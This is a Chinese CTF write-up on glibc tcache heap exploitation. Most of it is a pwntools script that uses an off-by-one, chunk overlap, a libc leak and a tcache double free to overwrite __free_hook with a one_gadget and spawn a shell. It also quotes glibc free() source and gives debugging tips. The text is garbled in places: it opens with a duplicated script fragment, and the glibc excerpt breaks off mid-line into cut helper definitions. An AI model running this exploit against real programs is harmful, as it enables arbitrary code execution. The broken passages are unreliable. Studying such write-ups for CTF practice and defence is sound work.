        # chunk-6
        # chunk-8 
        # chunk-0
        #
        # chunk-7
        puts(0)
这时候我们puts(0)就可以泄露了，
#### 后面简单的double free
    libc_leak = u64(io.recvline().strip().ljust(8, '\x00'))
        io.success("libc_leak: 0x%x" % libc_leak)
        libc_base = libc_leak - 0x3ebca0
        malloc(0x10, str(0x9))
        # now the heap
        # chunk-1 
        # chunk-2
        # chunk-3
        # chunk-4
        # chunk-5
        # chunk-6
        # chunk-8 
        # chunk-0 chunk-9
        #
        # chunk-7
        free(1) #bypass the tcache count check
        free(0) 
        free(9) #double free
        free_hook = libc_base + libc.symbols['__free_hook']
        one_gadget = libc_base + 0x4f2c5 
        one_gadget = libc_base + 0x4f322# 0x10a38c
        malloc(0x10, p64(free_hook))
        malloc(0x10, '/bin/sh;#')
        malloc(0x10, p64(one_gadget))
        io.success("free_hook: 0x%x" % free_hook)
        #gdb.attach(io)
        free(0)
这里有个注意的地方，free(1)这里看好
    4194    ------------------------------ free ------------------------------    4195  */
    4196 
    4197 static void
    4198 _int_free (mstate av, mchunkptr p, int have_lock)
    4199 {
    4200   INTERNAL_SIZE_T size;        /* its size */
    4201   mfastbinptr *fb;             /* associated fastbin */
    4202   mchunkptr nextchunk;         /* next contiguous chunk */
    4203   INTERNAL_SIZE_T nextsize;    /* its size */
    4204   int nextinuse;               /* true if nextchunk is used */
    4205   INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
    4206   mchunkptr bck;               /* misc temp for linking */
    4207   mchunkptr fwd;               /* misc temp for linking */
    4208 
    4209   size = chunksize (p);
    4210 
    4211   /* Little security check which won't hurt performance: the
    4212      allocator never wrapps around at the end of the address space.
    4213      Therefore we can exclude some size values which might appear
    4214      here by accident or by "design" from some intruder.  */
    4215   if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
    4216       || __builtin_expect (misaligned_chunk (p), 0))
    4217     malloc_printerr ("free(): invalid pointer");
    4218   /* We know that each chunk is at least MINSIZE bytes in size or a
    4219      multiple of MALLOC_ALIGNMENT.  */
    4220   if (__glibc_unlikely (size  chance), so verify it's not an unlikely coincidence
    4235        before aborting.  */
    4236     if (__glibc_unlikely (e->key == tcache && tcache))
    4237       {
    4238         tcache_entry *tmp;
    4239         LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
    4240         for (tmp = tcache->entries[tc_idx];
    4241              tmp;
    4242              tmp = tmp->next)
    4243           if (tmp == e)
    4244             malloc_printerr ("free(): double free detected in tcache 2");
    4245         /* If we get here, it was a coincidence.  We've wasted a few
    4246            cycles, but don't abort.  */
    4247       }
    4248 
    4249     if (tcache
    4250         && tc_idx counts[tc_idx]  ", str(idx))
    def malloc(size, content):
        choice(1)
        io.sendlineafter("> ", str(size))
        io.sendlineafter("> ", content)
    def free(idx):
        choice(2)
        io.sendlineafter("> ", str(idx))
    def puts(idx):
        choice(3)
        io.sendlineafter("> ", str(idx))
    def exit():
        choice(4)
    #功能性测试
    def test():
        malloc(0x20, 'a'*0x20)
        puts(0)
        free(0)
        exit()
    def exp():
        for i in range(7):
            malloc(0x10, str(i)*0x7)
        for i in range(3):
            malloc(0x10, str(i+7)*0x7)
        for i in range(6):
            free(i)
        free(9) #tcache for avoid top chunk consolidate
        for i in range(6, 9):
            free(i)
        # now the heap 
        # tcache-0
        # tcache-1
        # tcache-2
        # tcache-3
        # tcache-4
        # tcache-5
        # unsorted - 6
        # unsorted - 7
        # unsorted - 8
        # tcache-9
        for i in range(7):
            malloc(0x10, str(i)*0x7)
        for i in range(3):
            malloc(0x10, str(i+7)*0x7)
        # now the heap 
        # chunk-6
        # chunk-5
        # chunk-4
        # chunk-3
        # chunk-2
        # chunk-1
        # chunk - 7
        # chunk - 8
        # chunk - 9
        # chunk-0
        for i in range(6):
            free(i)
        free(8)
        free(7)
        # now chunk -9's pre_size is 0x200
        malloc(0xf8, str(8)*0x7) #off-by-one change chunk9's insue
        free(6) # free into tcache, so we can use unsortbin consolidate
        free(9) # unsortbin consolidate
        # now the heap 
        # chunk-6   tcache
        # chunk-5   tcache
        # chunk-4   tcache
        # chunk-3   tcache
        # chunk-2   tcache
        # chunk-1   tcache
        # chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk
        # chunk - 8 use          this is the overlap
        # chunk - 9 unsorted
        # chunk-0   tcache
        for i in range(7):
            malloc(0x10, str(i+1)*0x7)
        malloc(0x10, str(0x8))
        # now the heap
        # chunk-1 
        # chunk-2
        # chunk-3
        # chunk-4
        # chunk-5
        # chunk-6
        # chunk-8 
        # chunk-0
        #
        # chunk-7
        puts(0)
        libc_leak = u64(io.recvline().strip().ljust(8, '\x00'))
        io.success("libc_leak: 0x%x" % libc_leak)
        libc_base = libc_leak - 0x3ebca0
        malloc(0x10, str(0x9))
        # now the heap
        # chunk-1 
        # chunk-2
        # chunk-3
        # chunk-4
        # chunk-5
        # chunk-6
        # chunk-8 
        # chunk-0 chunk-9
        #
        # chunk-7
        free(1) #bypass the tcache count check
        free(0) 
        free(9) #double free
        free_hook = libc_base + libc.symbols['__free_hook']
        one_gadget = libc_base + 0x4f2c5 
        one_gadget = libc_base + 0x4f322# 0x10a38c
        malloc(0x10, p64(free_hook))
        malloc(0x10, '/bin/sh;#')
        malloc(0x10, p64(one_gadget))
        io.success("free_hook: 0x%x" % free_hook)
        #gdb.attach(io)
        free(0)
    if __name__ == '__main__':
        exp()
        io.interactive()
## 小知识点
vmmap 这个命令可以指定具体想要查看的内容，比如
  1. vmmap libc
  2. vmmap heap
  3. vmmap stack
  4. vmmap map
tcache是FILO,跟栈是类似的
patchelf 可以指定版本libc, 这样可以调试带符号的libc，加上glibc-all-in-one这个项目或者自己去下载glibc就可以用pwndbg的那些heap bins等命令了  
具体如下：  
patchelf --set-interpreter libc目录/ld-2.27.so --set-rpath libc目录 文件名
## 总结
  1. 加入tcache后攻击方法变得相对简单，堆块的申请却变得复杂了，因为在leak的时候要考虑tcache，以及构造的时候也要考虑tcache
  2. 我觉得不需要跟我一样标注出每个堆块的位置，我只是学习tcache，所以标注出来方便自己看
  3. 堆块重用这部分经常都是跟off-by-one结合起来
## 参考链接
[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-1-lctf2018-pwn-easy_heap)